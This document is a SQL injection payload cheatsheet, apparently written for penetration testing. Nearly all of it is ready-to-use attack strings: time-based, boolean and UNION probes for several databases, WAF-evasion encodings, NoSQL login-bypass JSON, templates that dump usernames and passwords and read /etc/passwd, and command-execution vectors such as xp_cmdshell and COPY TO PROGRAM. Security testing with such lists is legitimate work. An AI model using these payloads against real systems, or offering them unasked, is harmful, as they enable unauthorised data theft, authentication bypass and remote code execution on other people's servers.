# SQLi — Payload Cheatsheet

## Detection Payloads

### Error-Based Detection
```sql
'
"
' OR '1'='1
" OR "1"="1
' OR '1'='1' --
1' AND '1'='2
1" AND "1"="2
```

### Time-Based Blind
```sql
-- MySQL
' AND SLEEP(5)-- -
' AND BENCHMARK(10000000,SHA1('a'))-- -

-- PostgreSQL
' AND pg_sleep(5)-- -
'; SELECT pg_sleep(5)-- -

-- MSSQL
' WAITFOR DELAY '0:0:5'-- -
'; WAITFOR DELAY '0:0:5'-- -

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a'-- -

-- SQLite
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -
```

### Boolean-Based Blind
```sql
' AND 1=1-- -    (true condition)
' AND 1=2-- -    (false condition)
' AND SUBSTRING(@@version,1,1)='5'-- -
```

### UNION-Based
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
-- Increment NULLs until no error → column count
' UNION SELECT 1,2,3-- -
-- Find which column reflects in output
```

### Stacked Queries
```sql
'; SELECT 1-- -
'; EXEC xp_cmdshell('whoami')-- -
```

## WAF Bypass Patterns

### Generic Bypasses
```sql
-- Space alternatives
'/**/AND/**/1=1-- -
'+AND+1=1-- -
'%09AND%091=1-- -
'%0aAND%0a1=1-- -

-- Keyword alternatives
' UNION ALL SELECT (not just UNION SELECT)
' /*!UNION*/ /*!SELECT*/  (MySQL inline comment)
' UN/**/ION SE/**/LECT

-- Case mixing
' uNiOn SeLeCt

-- Encoding
%27%20OR%201=1-- -  (URL encoded)
```

### MySQL Specific
```sql
/*!50000UNION*//*!50000SELECT*/
0x756e696f6e2073656c656374  (hex encoding)
```

### PostgreSQL Specific
```sql
' UNION SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'-- -
'; COPY (SELECT '') TO PROGRAM 'id'-- -  (RCE)
```

## Framework-Specific

### PHP + MySQL
```sql
-- Magic quotes bypass (old PHP)
%bf%27 OR 1=1-- -  (GBK encoding bypass)
```

### Node.js + MongoDB (NoSQLi)
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": ""}}
```

### Python + SQLAlchemy
```
-- Usually parameterized, look for raw() or text() calls
-- f-string injection in ORM filters
```

## Data Extraction Templates

### MySQL
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password FROM users-- -
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
```

### PostgreSQL
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -
' UNION SELECT string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'-- -
```

### MSSQL
```sql
' UNION SELECT name,NULL FROM sysdatabases-- -
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- -
```

## Validation Criteria

1. Error-based: database error message with SQL syntax visible
2. Blind: measurable time delay (≥4s) or boolean response difference
3. UNION: data from another table visible in response
4. Data extracted must be from a table OTHER than the one queried

## Impact Escalation

| Impact | What to demonstrate |
|--------|-------------------|
| Data read | Extract data from a table the user shouldn't access |
| Data write | INSERT/UPDATE in a table (use test data) |
| Auth bypass | Login as admin without valid credentials |
| File read | LOAD_FILE or equivalent to read server files |
| RCE | xp_cmdshell, INTO OUTFILE to webroot, COPY TO PROGRAM |
